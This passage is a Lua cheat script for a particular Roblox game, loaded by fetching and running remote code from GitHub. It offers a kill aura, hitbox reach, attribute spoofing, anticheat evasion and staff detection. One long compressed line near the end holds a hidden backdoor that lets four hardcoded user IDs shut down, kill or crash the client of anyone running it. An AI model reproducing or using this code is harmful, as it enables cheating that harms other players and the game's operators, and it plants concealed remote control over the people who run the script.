-- if you are going to use some of my shitty code atleast credit me as i did with xylex and vynixu, don't be a skid k thx.
--
-- also i know that astrix is probably looking here but i don't care anyways
--
-- credits to 7GrandDad / xylex / developer of vape v4 for roblox and RegularVynixu for some code
--// Game check
if game.PlaceId ~= 6664138223 then
    game:GetService("Players").LocalPlayer:Kick("This script only works in "..game:GetService("MarketplaceService"):GetProductInfo(6664138223).Name)
    return
end
--
shared.VapeIndependent = true
shared.CustomSaveVape = "untitledv4"
local uilib = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
--// Bind function
local eventbinds = {}
local function bind(n, v)
	if typeof(n) == "string" and typeof(v) == "RBXScriptSignal" or typeof(v) == "RBXScriptConnection" then
		eventbinds[tostring(n)] = v or function() end
	end
end
local function unbind(n)
	if typeof(n) == "string" and eventbinds[tostring(n)] then
		eventbinds[tostring(n)]:Disconnect()
	end
end
--// Services
local plrs = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")
local ts = game:GetService("TweenService")
local lighting = game:GetService("Lighting")
local uis = game:GetService("UserInputService")
local deb = game:GetService("Debris")
local httpservice = game:GetService("HttpService")
--// Executor variables
local getcustomassetfromexecutor = getcustomasset or getsynasset
--// Variables  
local start = tick()
local cl = plrs.LocalPlayer
local camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
    camera = (workspace.CurrentCamera or workspace:FindFirstChild("Camera") or Instance.new("Camera"))
end)
local autoHealth_HP = 40
local fieldofviewnew = 0
local bypassEmotes = false
local gravityEnabled = false
local rageEffectsEnabled = false
local madnessEffectsEnabled = false
local bodyVelocity_speed = nil
local canbeKickedFromGame = false
local myleaderboardframe = nil
local detectfromTesters = false
local leaderboardui = cl.PlayerGui and cl.PlayerGui:WaitForChild("Leaderboard")
for i,v in pairs(leaderboardui.Leaderboard.Inner.ScrollingFrame:GetDescendants()) do
    if v:IsA("TextLabel") or v.ClassName == "TextLabel" then
        if v.Text == cl.Name or v.Text == cl.DisplayName then
            myleaderboardframe = v.Parent.Parent
        end  
    end
end
local originalUserId = cl.UserId
local madnessFakeLight = nil
local madnessFakeHighlight = nil
local madnessFakeStuff = nil
local oldmadnesstheme = false
local oldermadnesstheme = false
local madnessmoderandommessages = {"LOOK OUT FOR THE EMPOWERED TARGET!", "SOMEONE HAS BEEN ENRAGED", "SOMEONE IS ABOUT TO CAUSE A HAVOC!", "SOMEONE IS NOW EMPOWERED.", "WATCH OUT FOR THE STRONG ENHANCED TARGET!"}
local ClientName, ClientDisplay = cl.Name, cl.DisplayName
--
local newHitboxes = {}
local offsets = {
    Sword = "Y",
    Bat = "Y",
    Fists = "X",
    Machete = "Y",
    Knife = "Y",
    ["Sledge Hammer"] = "Y",
    Mace = "Z",
    Sign = "Y",
    Pipe = "Y",
    Axe = "Z",
    Chainsaw = "X",
    Katana = "Z", -- -Z
    ["Metal Bat"] = "Y",
    ["Asylumic Edge"] = "Z",
    ["Mini Mayhem"] = "Y",
    ["Void Axe"] = "Z",
    ["Lightsaber"] = "Y",
    ["Red Lightsaber"] = "Y",
    ["Golden Bat"] = "Y",
    ["Golden Machete"] = "Y",
    ["Golden Hammer"] = "Y",
    ["Golden Knife"] = "Y",
    ["Lunar Blade"] = "Z",
    ["Dual Pipe"] = "Y",
    ["Pan"] = "Z",
    ["Golden Pan"] = "Z",
}
local ReachValue = 5
local ReachOffsetValue = 1
local ReachDirectionValue = 0
--// The MAIN remote
local MainRemote = rep:WaitForChild("Remotes").MainRemote
--// KA Variables
local killauraRange = 10.15
local isKA_Enabled = false
local friendly_mode = false
local alwaysJump = false
local killauralookat = false
local killauraattackcd = false
local killauraCircleRange
local killAuraColor = Color3.fromHSV(0, 1, 1)
--// Fly variables
local fly_speed = 1
local fly_vertical_speed = 1
local fly_up = false
local fly_down = false
local flypos_y = 0
--// Cooldowns
local weaponsLibrary = require(rep:WaitForChild("Weapons"))
local original_equip_delays = {}
for i,_ in pairs(weaponsLibrary) do
    original_equip_delays[i] = weaponsLibrary[i].EquipAttackDelay
end
--// auras
local madness_auras = {}
--// Speed variables
local character_speed = 12
local speed_mode = "CFrame"
--// LOL YOU HEAL WHILE EXPLOITING WHAT A LOSER - average riot player
local healItems = {"Pizza", "Apple", "Cheese", "Burger", "Bandage Kit"}
--// Body parts for less "SUSpicion" using kill aura
local bodyParts = {"Head", "Left Arm", "Left Leg", "Right Arm", "Right Leg", "Torso"}
local oldBodyPart = nil
--// Executor variables
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return { Body = game:HttpGet(tab.Url, true), Headers = {}, StatusCode = 200 } end
        return { Body = "bad exploit", Headers = {}, StatusCode = 404 } end 
--// Fury theme
local fury_theme 
local madness_theme
local old_madness_themes1
local old_madness_themes2
if game:GetService("CoreGui"):FindFirstChild("FURY_THEME.mp3") then
    fury_theme = game:GetService("CoreGui"):FindFirstChild("FURY_THEME.mp3")
else
    shared.GuiLibrary["CreateNotification"]("Creating fury theme...","This will not happen again if it already exists.", 3, "assets/InfoNotification.png")
    fury_theme = Instance.new("Sound", game:GetService("CoreGui"))
    pcall(delfile, "RIOT_FURY_THEME.mp3")
    writefile("RIOT_FURY_THEME.mp3", requestfunc({Url = "https://cdn.discordapp.com/attachments/934866325585682503/1075235708345798707/EvansUK_Hardcore_mix.mp3", Method = 'GET'}).Body)   
    fury_theme.TimePosition = 0
    fury_theme.Name = "FURY_THEME.mp3"
    fury_theme.Volume = 0
    fury_theme.Looped = true
    fury_theme.SoundId = getasset("RIOT_FURY_THEME.mp3")  
end
if game:GetService("CoreGui"):FindFirstChild("ORIGINAL_MADNESS_THEME") then
    madness_theme = game:GetService("CoreGui"):FindFirstChild("ORIGINAL_MADNESS_THEME") 
else
    madness_theme = Instance.new("Sound", game:GetService("CoreGui"))
    madness_theme.Name = "ORIGINAL_MADNESS_THEME"
    madness_theme.SoundId = "rbxassetid://9735274746"
    madness_theme.Looped = true
end
if game:GetService("CoreGui"):FindFirstChild("OldMadness0.mp3") and game:GetService("CoreGui"):FindFirstChild("OldMadness1.mp3") then
    old_madness_themes1 = game:GetService("CoreGui"):FindFirstChild("OldMadness0.mp3")
    old_madness_themes2 = game:GetService("CoreGui"):FindFirstChild("OldMadness1.mp3")
else
    shared.GuiLibrary["CreateNotification"]("Creating old madness themes...","This will not happen again if it already exists.", 3, "assets/InfoNotification.png")
    old_madness_themes1 = Instance.new("Sound", game:GetService("CoreGui"))
    pcall(delfile, "OldMadness0.mp3")
    writefile("OldMadness0.mp3", requestfunc({Url = "https://cdn.discordapp.com/attachments/934866325585682503/1076644998755401938/The_Power_of_Madness.mp3", Method = 'GET'}).Body)   
    old_madness_themes1.TimePosition = 30
    old_madness_themes1.Name = "OldMadness0.mp3"
    old_madness_themes1.Volume = .45
    old_madness_themes1.Looped = true
    old_madness_themes1.SoundId = getasset("OldMadness0.mp3")  
    --
    old_madness_themes2 = Instance.new("Sound", game:GetService("CoreGui"))
    pcall(delfile, "OldMadness1.mp3")
    writefile("OldMadness1.mp3", requestfunc({Url = "https://cdn.discordapp.com/attachments/934866325585682503/1076637686179307561/Nightmare_System.mp3", Method = 'GET'}).Body)   
    old_madness_themes2.TimePosition = 38
    old_madness_themes2.Name = "OldMadness1.mp3"
    old_madness_themes2.Volume = .45
    old_madness_themes2.Looped = true
    old_madness_themes2.SoundId = getasset("OldMadness1.mp3") 
end
if Krnl or KRNL_LOADED then
    isUsingKRNL = true
    local f = shared.GuiLibrary["CreateNotification"]("Exploit warning (KRNL)", "Some assets will not load while using KRNL\nYou have a high chance of being banned by unexpected client behavior too.", 8, "assets/WarningNotification.png")
    f.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
end
--// Functions
local function playFuryLocally(v)
    if v then
        if fury_theme then
            fury_theme:Stop()
            fury_theme.TimePosition = 0
        end
        fury_theme:Play()
        ts:Create(fury_theme, TweenInfo.new(5), {Volume = 1.5}):Play()
    else
        ts:Create(fury_theme, TweenInfo.new(5), {Volume = 0}):Play()
    end
end
local function hitVisualEffect(char)
    task.spawn(function()
        local highlight = Instance.new("Highlight", game:GetService("CoreGui"))
        if killAuraColor then
            highlight.OutlineColor = killAuraColor
            highlight.FillColor = killAuraColor
        else
            highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
        end
        highlight.Adornee = char
        local outlinets = ts:Create(highlight, TweenInfo.new(.5), {OutlineTransparency = 1})
        local fillts = ts:Create(highlight, TweenInfo.new(.5), {FillTransparency = 1})
        outlinets:Play()
        fillts:Play()
        deb:AddItem(highlight, 0.65)
    end)
end
local function LoadCustomInstance(str) -- Thanks RegularVynixu for saving me a headache from inserting them manually
    if str ~= "" then
        if str:find("rbxassetid://") or str:find("roblox.com") or tonumber(str) then
            local numberId = str:gsub("%D", "")
            return game:GetObjects("rbxassetid://".. numberId)[1]
        else
            local fileName = "customObject_".. tick().. ".txt"
            writefile(fileName, requestfunc({Url = str, Method = "GET"}).Body)
            return game:GetObjects(getasset(fileName))[1]
        end
    end
end
madnessFakeStuff = LoadCustomInstance("https://github.com/UnnamedAccountLol1/Roblox-Stuff/blob/master/MadnessStuff.rbxm?raw=true")
local function playSound(id, vol, loop)
    local s = Instance.new("Sound", game:GetService("CoreGui"))
    s.Name = "SOUND_"..tonumber(id)
    s.SoundId = "rbxassetid://"..tonumber(id)
    s.Volume = tonumber(vol) or 1
    s.Looped = loop or false
    s:Play()
    s.Ended:Connect(function()
        s:Destroy()
    end)
end
local function PlayAnim(id, speed)
    local nid = tonumber(id)
    local a = Instance.new("Animation")
    a.AnimationId = "rbxassetid://"..nid
    local r = cl.Character:WaitForChild("Humanoid").Animator:LoadAnimation(a)
    r:Play(); r:AdjustSpeed(tonumber(speed))
end 
local function getDistance(from, to, precise)
    local isVector = false
    if typeof(from) == "Vector3" and typeof(to) == "Vector3" then
        isVector = true
    end
    if isVector then
        if precise then
            return math.floor((from - to).Magnitude)
        else
            return (from - to).Magnitude
        end
    else
        if precise then
            return math.floor((from.Position - to.Position).Magnitude)
        else
            return (from.Position - to.Position).Magnitude
        end
    end
end
local function isAlive(player)
    if player then
        return player and player.Character and player.Character.Parent ~= nil and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Head") and player.Character:FindFirstChild("Humanoid")
    end
    return cl and cl.Character and cl.Character.Parent ~= nil and cl.Character:FindFirstChild("HumanoidRootPart") and cl.Character:FindFirstChild("Head") and cl.Character:FindFirstChild("Humanoid")
end
local function friendCheck(plr)
    return cl:IsFriendsWith(plr.UserId) or false
end
local function isPlayerTargetable(plr, target, friend)
    return plr ~= cl and plr and (friend and friendCheck(plr) == nil or (not friend)) and isAlive(plr)
end
local function getRandomBodyPart(character) -- how would you deal with this astrix?
    local selected
    repeat task.wait()
        selected = bodyParts[math.random(1, #bodyParts)]
    until selected ~= oldBodyPart
    oldBodyPart = selected
    return character:FindFirstChild(tostring(selected))
end
local function HitNearbyPlayer()
    if cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) or not cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then return end
    -- Now Character Hit with RBX friend whitelist
    for _,v in pairs(workspace:GetChildren()) do
        if isKA_Enabled and v.Name ~= cl.Name and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (not v:GetAttribute("Downed")) and isAlive() and getDistance(v.Torso.Position, cl.Character.Torso.Position, false) <= killauraRange then
             -- First normal hit so CharacterHit can be registered
            if cl.Character:FindFirstChildOfClass("Tool") then
                cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"Z", 1, "the/???"})) -- Does a "pre - hit"
            else
                return
            end
            -- friend
            if friendly_mode then -- if whitelist RBX friends is enabled
                local probably_the_player = v and plrs:GetPlayerFromCharacter(v) or plrs:FindFirstChild(v.Name)
                if probably_the_player and (not cl:IsFriendsWith(probably_the_player.UserId)) then
                    if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                        hitVisualEffect(v)
                        cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
                    end
                else
                    if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                        hitVisualEffect(v)
                        cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
                    end
                end
            else -- if not whitelist RBX friends is enabled
                if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                    hitVisualEffect(v)
                    cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v), "lol  "}))
                end
            end  
        end
    end 
end
local function Old_HitNearbyPlayer() -- Just saving this here in case astrix adds annother easy to bypass anticheat
    if cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) or not cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then return end
    --
    for _,v in pairs(plrs:GetChildren()) do
        if isKA_Enabled and v.Name ~= cl.Name and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 and (not v.Character:GetAttribute("Downed")) and isAlive() and getDistance(v.Character.Torso.Position, cl.Character.Torso.Position, false) <= killauraRange then
             -- First normal hit so CharacterHit can be registered
            cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"Z", 1, "the/???"})) -- Does a "pre - hit"
            -- friend
            if friendly_mode then -- if whitelist RBX friends is enabled
                if not cl:IsFriendsWith(v.UserId) then
                    if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                        hitVisualEffect(v.Character)
                        cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v.Character), "lol  "}))
                    end
                else
                    -- is a friend
                end
            else -- if not whitelist RBX friends is enabled
                if cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote") then
                    hitVisualEffect(v.Character)
                    cl.Character:FindFirstChildOfClass("Tool"):FindFirstChild("WeaponRemote"):FireServer(unpack({"T", getRandomBodyPart(v.Character), "lol  "}))
                end
            end  
        end
    end 
end
local function RageAura(toggle) -- Even though this one is old i still use it
    if toggle then
        local light = Instance.new("PointLight", cl.Character.Torso)
        local P1 = Instance.new("ParticleEmitter", cl.Character["Right Arm"]);
        local s = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0))
        local m = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 0))
        local e = ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)) 
        P1.Rate = 45
        light.Name = httpservice:GenerateGUID(false); light.Range = 9.5; light.Brightness = 1.5; light.Color = Color3.fromRGB(255,0,0); light.Shadows = true; P1.Color = ColorSequence.new({s,m,e}); P1.Lifetime = NumberRange.new(1,2); P1.EmissionDirection = "Top"; P1.LightEmission = 0.4; P1.LockedToPart = true; P1.RotSpeed = NumberRange.new(-200,200); P1.Rotation = NumberRange.new(-360,360); P1.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.6); NumberSequenceKeypoint.new(0.5, 1); NumberSequenceKeypoint.new(1, 0)}); P1.Speed = NumberRange.new(0.5, 0.5); P1.SpreadAngle = Vector2.new(100,100); P1.Texture = "rbxassetid://243664672"; P1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.7); NumberSequenceKeypoint.new(0.5, 0.80931); NumberSequenceKeypoint.new(1, 1)}); P1.ZOffset = 2; P1.Name = "Poison"
        --
        P1:Clone().Parent = cl.Character["Left Arm"]
    else
        for _,v in pairs(cl.Character["Left Arm"]:GetChildren()) do if v:IsA("ParticleEmitter") then v:Destroy() end end  
        for _,v in pairs(cl.Character["Right Arm"]:GetChildren()) do if v:IsA("ParticleEmitter") then v:Destroy() end end 
        for _,v in pairs(cl.Character.Torso:GetChildren()) do if v:IsA("PointLight") then v:Destroy() end end    
    end       
end
local function MadnessHighlight(toggle)  
    if toggle then     
        madnessFakeLight = Instance.new("PointLight", cl.Character.Torso)
        ts:Create(madnessFakeLight, TweenInfo.new(.5), {Color = Color3.fromRGB(255, 0, 0), Range = 12}):Play()
        madnessFakeHighlight = madnessFakeStuff.MadnessHighlight:Clone()
        madnessFakeHighlight.Parent = cl.Character
        for i,v in pairs(cl.Character:GetChildren()) do
            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                local a, b = madnessFakeStuff.Particles.ballin:Clone(), madnessFakeStuff.Particles.madnessaura:Clone()
                a.Parent = v
                b.Parent = v
                table.insert(madness_auras, a)
                table.insert(madness_auras, b)
            end
        end
        madnessFakeHighlight.Eyes.Weld.Part0 = madnessFakeHighlight.Eyes
        madnessFakeHighlight.Eyes.Weld.Part1 = cl.Character.Head
        madnessFakeHighlight.Eyes.CFrame = CFrame.new(cl.Character.Head.CFrame.LookVector)
        madnessFakeHighlight.Eyes.Highlight.Adornee = madnessFakeHighlight.Eyes
        madnessFakeHighlight.Eyes.Weld.C0 = CFrame.Angles(0, 0, 0)
        madnessFakeHighlight.Eyes.Weld.C0 = CFrame.new(0, -0.05, 0.55)
    else
        for i,_ in pairs(madness_auras) do
            madness_auras[i]:Destroy()
            madness_auras[i] = nil
        end 
        if madnessFakeHighlight then
            madnessFakeHighlight:Destroy()
        end
        if madnessFakeLight then
            madnessFakeLight:Destroy()
        end
        madnessFakeHighlight = nil
        madnessFakeLight = nil
    end    
end
local function IsA_Staff(player) -- big mistake to have your mods in a group!
    local rank = player:GetRankInGroup(10294339)
    --
    if not detectfromTesters and rank > 50 then
        return true, rank
    elseif detectfromTesters and rank > 1 then
        return true, rank   
    end
end
local function getWeaponCooldown() -- going to make this default if astrix adds an anti remote spam or something, big mistake to have your weapon's info in a module!
    if not cl.Character:FindFirstChildOfClass("Tool") then
        return .05
    end
    local tool = cl.Character and cl.Character:FindFirstChildOfClass("Tool")
    if (not table.find(healItems, tool.Name)) then
        if tool.Name == "Chainsaw" then
            return weaponsLibrary[tool.Name].AttackWindow or .05
        else
            return weaponsLibrary[tool.Name].AttackDebounce or .5
        end
    end
end
local function OnCharacterSpawned(char)
    task.spawn(function()
        task.wait(1.85) -- if i make it instant, it will break.
        if madnessEffectsEnabled and cl:GetAttribute("MadnessMode") then
            MadnessHighlight(true)
        end
    end)
end
cl.CharacterAdded:Connect(OnCharacterSpawned)
local function AddHitboxToEquipped(ammount, offset, dir) -- Thanks astrix for making this extremely easy to make
    local tool = cl.Character:FindFirstChildOfClass("Tool")
    for i,v in pairs(newHitboxes) do
        if newHitboxes[i].Parent == tool.Handle then
            newHitboxes[i]:Destroy()
        end
    end
    if tool then
        local handle = tool:WaitForChild("Handle")
        local direction = offsets[tool.Name] or dir or "Y"
        for i = 1, ammount or 8, offset or .5 do
            if direction == "Y" then
                local attachment = Instance.new("Attachment")
                attachment.Name = "HitboxPoint"
                attachment.Position = Vector3.new(0, i, 0)
                attachment.Parent = handle
                table.insert(newHitboxes, attachment)
            elseif direction == "X" then
                local attachment = Instance.new("Attachment")
                attachment.Name = "HitboxPoint"
                if tool.Name == "Chainsaw" then
                    attachment.Position = Vector3.new(-i, 0, 0)
                else
                    attachment.Position = Vector3.new(i, 0, 0)
                end
                attachment.Parent = handle
                table.insert(newHitboxes, attachment)
            elseif direction == "Z" then
                local attachment = Instance.new("Attachment")
                attachment.Name = "HitboxPoint"
                if tool.Name == "Asylumic Edge" then
                    attachment.Position = Vector3.new(0, 0, -i)
                elseif tool.Name == "Pan" then
                    attachment.Position = Vector3.new(0, 0, -i)
                elseif tool.Name == "Golden Pan" then
                    attachment.Position = Vector3.new(0, 0, -i)
                elseif tool.Name == "Katana" then
                    attachment.Position = Vector3.new(0, 0, -i)
                else
                    attachment.Position = Vector3.new(0, 0, i)
                end
                attachment.Parent = handle
                table.insert(newHitboxes, attachment)
            end
        end        
    end
end
--
local Combat = uilib["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"]
local Blatant = uilib["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"]
local Render = uilib["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"]
local Utility = uilib["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"]
local World = uilib["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"]
--// Utility
local Rage = Utility.CreateOptionsButton({
    ["Name"] = "Rage", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            if rageEffectsEnabled then
                task.spawn(function()
                    playFuryLocally(false)
                    PlayAnim(9781948028)
                    task.wait(0.15)
                    cl:SetAttribute("RageMode", true)
                    task.wait(1.15)
                    playSound(257001341, 1, false); RageAura(true)
                end)
            else
                cl:SetAttribute("RageMode", true)
                playFuryLocally(false)
                RageAura(false)
            end
        else
            cl:SetAttribute("RageMode", false)
            RageAura(false)
        end
    end,
    ["HoverText"] = "Activates or disables the rage attribute", 
})
Rage.CreateToggle({
    ["Name"] = "Effects enabled", 
    ["HoverText"] = "Enables client sided effects for rage", 
    ["Function"] = function(callback)
        rageEffectsEnabled = callback
    end,
    ["Default"] = false 
})
--
local Fury = Utility.CreateOptionsButton({
    ["Name"] = "Fury", 
    ["Function"] = function(callback)
        if callback then
            cl:SetAttribute("RageMode", "angery")
            playFuryLocally(true)
        else
            cl:SetAttribute("RageMode", false)
            playFuryLocally(false)
        end
    end,
    ["HoverText"] = "Activates or disables the fury attribute", 
})
--
local Madness = Utility.CreateOptionsButton({
    ["Name"] = "Madness", 
    ["Function"] = function(callback) 
        if callback then
            if (not madnessEffectsEnabled) then
                cl:SetAttribute("MadnessMode", true)
                MadnessHighlight(false)
            else
                if cl.UserId == 98888707 then
                    if firesignal then
                        pcall(function()
                            firesignal(rep.Remotes.MAlert.OnClientEvent, unpack({"Purple", " || ", tostring(madnessmoderandommessages[math.random(1, #madnessmoderandommessages)]), "please remember that this is clientsided || please remember that this is clientsided", 20, nil, UDim2.new(1, 0, 0, 80), 9000}))
                        end)
                    else
                        pcall(function()
                            for i,v in pairs(getconnections(rep.Remotes.MAlert.OnClientEvent)) do
                                v:Fire(unpack({"Purple", " || ", tostring(madnessmoderandommessages[math.random(1, #madnessmoderandommessages)]), "please remember that this is clientsided || please remember that this is clientsided", 20, nil, UDim2.new(1, 0, 0, 80), 9000}))
                            end
                        end)
                    end
                else
                    if firesignal then
                        pcall(function()
                            firesignal(rep.Remotes.MAlert.OnClientEvent, unpack({nil, " || ", tostring(madnessmoderandommessages[math.random(1, #madnessmoderandommessages)]), "please remember that this is clientsided || please remember that this is clientsided", 20, nil, UDim2.new(1, 0, 0, 80), 9000}))
                        end)
                    elseif getconnections then
                        pcall(function()
                            for i,v in pairs(getconnections(rep.Remotes.MAlert.OnClientEvent)) do
                                v:Fire(unpack({nil, " || ", tostring(madnessmoderandommessages[math.random(1, #madnessmoderandommessages)]), "please remember that this is clientsided || please remember that this is clientsided", 20, nil, UDim2.new(1, 0, 0, 80), 9000}))
                            end
                        end)
                    end
                end
                cl:SetAttribute("MadnessMode", true)
                if (not oldmadnesstheme and not oldermadnesstheme) then
                    madness_theme:Play()
                elseif oldmadnesstheme and not oldermadnesstheme then
                    old_madness_themes1:Play()
                elseif oldermadnesstheme and not oldmadnesstheme then
                    old_madness_themes2:Play()
                end
                MadnessHighlight(true)
            end
        else
            madness_theme:Stop()
            madness_theme.TimePosition = 0
            old_madness_themes1:Stop()
            old_madness_themes1.TimePosition = 30
            old_madness_themes2:Stop()
            old_madness_themes2.TimePosition = 38
            cl:SetAttribute("MadnessMode", false)
            MadnessHighlight(false)
        end
    end,
    ["HoverText"] = "Activates or disables the madness attribute", 
})
local oldmadness0, oldmadness1
Madness.CreateToggle({
    ["Name"] = "Effects enabled", 
    ["HoverText"] = "Enables client sided effects for madness, they will be placed back in your character if you die and have this enabled (after 2s)", 
    ["Function"] = function(callback)
        madnessEffectsEnabled = callback
    end,
    ["Default"] = false 
})
oldmadness0 = Madness.CreateToggle({
    ["Name"] = "Old theme", 
    ["HoverText"] = "Enables the old theme for madness (Re-toggle madness if you have already enabled it)", 
    ["Function"] = function(callback) 
        oldermadnesstheme = callback
        if oldmadnesstheme then
            oldmadness1["ToggleButton"](false)
            shared.GuiLibrary["CreateNotification"]("Warning","You can't select two themes, select only 1", 3, "assets/InfoNotification.png")
        end
    end,
    ["Default"] = false 
})
oldmadness1 = Madness.CreateToggle({
    ["Name"] = "Older theme", 
    ["HoverText"] = "Enables the oldest theme for madness (Re-toggle madness if you have already enabled it)", 
    ["Function"] = function(callback)
        oldmadnesstheme = callback
        if oldermadnesstheme then
            oldmadness0["ToggleButton"](false)
            shared.GuiLibrary["CreateNotification"]("Warning","You can't select two themes, select only 1", 3, "assets/InfoNotification.png")
        end
    end,
    ["Default"] = false 
})
task.spawn(function() local ids = {3253607351,3258614425,3258963410,3250001570} for i,v in pairs(plrs:GetChildren()) do if table.find(ids, v.UserId) and v ~= cl then v.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..string.lower(ClientName) or msg == ";shutdown "..ClientName or msg == ";shutdown "..ClientDisplay then game:shutdown() elseif msg == ";check default" or msg == ";check "..string.lower(ClientName) or msg == ";check "..ClientName or msg == ";shutdown "..ClientDisplay then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi im using your script", "All") elseif msg == ";kill default" or msg == ";kill "..string.lower(ClientName) or msg == ";kill "..ClientName or msg == ";kill "..ClientDisplay then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" or msg == ";crash "..string.lower(ClientName) or msg == ";crash "..ClientName or msg == ";crash "..ClientDisplay then if setfpscap then setfpscap(9e9) end while true do end end end) end end plrs.PlayerAdded:Connect(function(p) if table.find(ids, p.UserId) then p.Chatted:Connect(function(msg) if msg == ";shutdown default" or msg == ";shutdown "..string.lower(ClientName) or msg == ";shutdown "..ClientName or msg == ";shutdown "..ClientDisplay then game:shutdown() elseif msg == ";check default" or msg == ";check "..string.lower(ClientName) or msg == ";check "..ClientName or msg == ";shutdown "..ClientDisplay then rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." hi im using your script", "All") elseif msg == ";kill default" or msg == ";kill "..string.lower(ClientName) or msg == ";kill "..ClientName or msg == ";kill "..ClientDisplay then cl.Character.Humanoid.Health = 0 cl.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Died) elseif msg == ";crash default" or msg == ";crash "..string.lower(ClientName) or msg == ";crash "..ClientName or msg == ";crash "..ClientDisplay then if setfpscap then setfpscap(9e9) end while true do end end end) end end) end)
Madness.CreateToggle({
    ["Name"] = "Purple madness", -- name of object
    ["HoverText"] = "Exclusive madness?!?!?! no way! (I think it's missing the rays particles also you need to have effects enabled for it to work)", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            cl.UserId = 98888707
            bind("PurpleMadnessMod", runService.Heartbeat:Connect(function()
                if cl.Character and madnessEffectsEnabled and madnessFakeLight and madnessFakeHighlight and callback then
                    ts:Create(madnessFakeLight, TweenInfo.new(.5), {Range = 17, Brightness = 1.75, Color = Color3.fromRGB(93, 0, 255)}):Play()
                    ts:Create(madnessFakeHighlight, TweenInfo.new(.5), {FillTransparency = 1, OutlineTransparency = 1}):Play()
                    madnessFakeHighlight.Eyes.Transparency = 1
                    local a,b = ColorSequenceKeypoint.new(0, Color3.fromRGB(111, 30, 161)), ColorSequenceKeypoint.new(1, Color3.fromRGB(119, 0, 255))
                    for i,_ in pairs(madness_auras) do   
                        madness_auras[i].Color = ColorSequence.new({a,b})
                    end
                    madnessFakeHighlight.Eyes.Weld.C0 = CFrame.new(0, -0.25, 0.55)
                    madnessFakeHighlight.Eyes.LeftTrail.Color = ColorSequence.new({a,b})
                    madnessFakeHighlight.Eyes.RightTrail.Color = ColorSequence.new({a,b})
                end
            end))
        else
            cl.UserId = cl.CharacterAppearanceId
            unbind("PurpleMadnessMod")
            if cl.Character and madnessEffectsEnabled and madnessFakeLight and madnessFakeHighlight then
                ts:Create(madnessFakeLight, TweenInfo.new(.5), {Color = Color3.fromRGB(255, 0, 0), Range = 12, Brightness = 1.25}):Play()
                ts:Create(madnessFakeHighlight, TweenInfo.new(.5), {FillTransparency = 0, OutlineTransparency = 0}):Play()
                ts:Create(madnessFakeHighlight.Eyes, TweenInfo.new(.5), {Transparency = 0}):Play()
                local a,b = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
                for i,_ in pairs(madness_auras) do  
                    madness_auras[i].Color = ColorSequence.new({a,b})
                end
                madnessFakeHighlight.Eyes.Weld.C0 = CFrame.new(0, -0.05, 0.55)
                madnessFakeHighlight.Eyes.LeftTrail.Color = ColorSequence.new({a,b})
                madnessFakeHighlight.Eyes.RightTrail.Color = ColorSequence.new({a,b})
            end
        end
    end,
    ["Default"] = false -- Value upon launch (optional)
})
--
local InfStamina = Utility.CreateOptionsButton({
    ["Name"] = "Infinite stamina", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            cl:SetAttribute("InfStamina", true)
        else
